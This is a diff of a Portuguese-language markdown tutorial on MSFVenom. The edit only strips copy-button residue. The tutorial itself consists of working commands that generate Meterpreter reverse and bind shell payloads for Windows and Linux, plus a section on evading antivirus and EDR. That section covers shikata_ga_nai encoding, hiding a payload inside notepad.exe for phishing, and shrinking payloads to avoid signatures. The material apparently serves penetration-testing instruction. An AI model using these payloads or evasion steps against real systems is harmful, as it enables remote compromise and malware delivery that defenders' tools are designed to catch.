@@ -4,10 +4,6 @@ O **MSFVenom** é uma ferramenta do **Metasploit** usada para gerar payloads e e
 
 A estrutura básica do comando `msfvenom` é:
 
-bash
-
-Copiar código
-
 `msfvenom -p <payload> LHOST=<IP> LPORT=<Porta> -f <formato> -o <arquivo_saida>`
 
 - **`-p` (Payload)**: Define o tipo de payload, por exemplo, `windows/meterpreter/reverse_tcp`.
@@ -19,25 +15,13 @@ Copiar código
 
 ### Exemplo 1: Payload reverso para Windows
 
-bash
-
-Copiar código
-
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell_reverse.exe`
 
 ### Exemplo 2: Payload de ligação para Linux
 
-bash
-
-Copiar código
-
 `msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=4444 -f elf -o bind_shell.elf`
 
 ### Exemplo 3: Payload em formato raw (somente shellcode)
-
-bash
-
-Copiar código
 
 `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shellcode.bin`
 
@@ -58,19 +42,11 @@ Para evitar a detecção por antivírus e EDR (Endpoint Detection and Response),
 
 Encoders aplicam uma camada de codificação ao payload, dificultando a detecção por assinaturas. Exemplo:
 
-bash
-
-Copiar código
-
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o bypassed_shell.exe`
 
 ### 2. Template com `-x`
 
 Permite incluir o payload em executáveis legítimos, como um instalador de software, útil em ataques de phishing:
-
-bash
-
-Copiar código
 
 `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -x notepad.exe -k -f exe -o hidden_shell.exe`
 
@@ -81,10 +57,6 @@ Combine encoders e use formatos alternativos como `raw` ou `hex`, passando o có
 ### 4. Payloads Menores e Códigos Customizados
 
 Payloads menores ou personalizados podem evitar a detecção por assinatura. A opção `-s` limita o tamanho do payload:
-
-bash
-
-Copiar código
 
 `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -s 200 -f exe -o small_shell.exe`
 
